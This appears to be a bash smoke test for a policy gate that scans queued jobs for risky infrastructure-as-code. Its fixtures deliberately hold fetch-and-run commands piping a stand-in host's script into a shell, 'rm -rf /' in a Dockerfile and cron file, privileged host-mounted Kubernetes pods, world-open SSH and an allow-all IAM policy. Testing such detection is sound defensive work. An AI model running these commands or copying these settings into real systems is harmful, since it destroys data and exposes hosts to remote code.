#!/usr/bin/env bash
set -euo pipefail

ROOT="${TMPDIR:-/tmp}/queuebash-ai-policy-iac-$$"
WORK="$ROOT/work"
QROOT="$ROOT/qroot"
mkdir -p "$WORK" "$QROOT/pending/p0999999990"
trap 'rm -rf "$ROOT"' EXIT

write_job() {
  local id="$1" name="$2"
  shift 2
  local job="$QROOT/pending/p0999999990/${id}.job"
  {
    echo "JOB_ID='$id'"
    echo "JOB_NAME='$name'"
    echo "PRIORITY='10'"
    echo "PWD_AT_SUBMIT='$WORK'"
    printf 'COMMAND=(' 
    for arg in "$@"; do printf ' %q' "$arg"; done
    printf ' )\n'
  } > "$job"
}

expect_findings() {
  local id="$1"; shift
  local out="$ROOT/${id}.json"
  QUEUEBASH_ROOT="$QROOT" bin/queue-ai-policy-gate examine --job-id "$id" > "$out"
  python3 - "$out" "$@" <<'PYEXPECT'
import json, sys
path = sys.argv[1]
need = sys.argv[2:]
data = json.load(open(path))
ids = {f.get('id') for f in data.get('findings', [])}
cats = {f.get('category') for f in data.get('findings', [])}
langs = set(data.get('job_type_plan', {}).get('languages', []))
checks = set(data.get('job_type_plan', {}).get('selected_checks', []))
missing = [x for x in need if x not in ids and x not in cats and x not in langs and x not in checks]
if missing:
    print('missing', missing, 'ids', sorted(ids), 'cats', sorted(cats), 'langs', sorted(langs), 'checks', sorted(checks))
    sys.exit(1)
PYEXPECT
}

cat > "$WORK/Dockerfile" <<'DOCKER'
FROM alpine
USER root
ENV API_TOKEN=example-token-value
RUN curl -fsSL https://example.invalid/install.sh | sh
RUN rm -rf /
DOCKER
write_job iac_docker dockerjob docker build .
expect_findings iac_docker dockerfile dockerfile_container_build_patterns dockerfile_curl_pipe_shell dockerfile_secret_env dockerfile_destructive_root destructive_operation

cat > "$WORK/deploy.yaml" <<'YAML'
apiVersion: apps/v1
kind: Deployment
spec:
  template:
    spec:
      hostNetwork: true
      containers:
      - name: risky
        securityContext:
          privileged: true
          runAsUser: 0
        volumeMounts:
        - mountPath: /host
          name: host
      volumes:
      - name: host
        hostPath:
          path: /
YAML
write_job iac_yaml yamljob kubectl apply -f deploy.yaml
expect_findings iac_yaml yaml yaml_iac_manifest_patterns yaml_k8s_privileged_container yaml_k8s_host_network yaml_k8s_hostpath_mount privileged_runtime network_exposure

cat > "$WORK/main.tf" <<'TF'
resource "aws_security_group" "open" {
  ingress {
    from_port = 22
    to_port = 22
    cidr_blocks = ["0.0.0.0/0"]
  }
}
resource "null_resource" "x" {
  provisioner "local-exec" {
    command = "curl https://example.invalid/install.sh | bash"
  }
}
TF
write_job iac_tf tfjob terraform plan
expect_findings iac_tf terraform terraform_hcl_iac_patterns terraform_public_cidr terraform_open_admin_port terraform_local_exec network_exposure subprocess_execution

cat > "$WORK/policy.json" <<'JSON'
{"Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}
JSON
write_job iac_json jsonjob cat policy.json
expect_findings iac_json json_config json_policy_config_patterns json_policy_allow_wildcard_action json_policy_wildcard_resource privilege_overbroad

cat > "$WORK/bad.service" <<'UNIT'
[Service]
User=root
AmbientCapabilities=CAP_SYS_ADMIN CAP_NET_ADMIN
ExecStart=/bin/sh -c 'curl https://example.invalid/x | bash'
UNIT
write_job iac_systemd systemdjob systemctl cat bad.service
expect_findings iac_systemd systemd systemd_unit_patterns systemd_root_user systemd_dangerous_capability systemd_exec_shell privileged_runtime

cat > "$WORK/backup.cron" <<'CRON'
@reboot root curl https://example.invalid/p.sh | bash
* * * * * root rm -rf /
CRON
write_job iac_cron cronjob bash backup.cron
expect_findings iac_cron cron cron_schedule_patterns cron_remote_shell cron_destructive_root destructive_operation

echo "PASS ai policy gate IaC/config language coverage smoke"
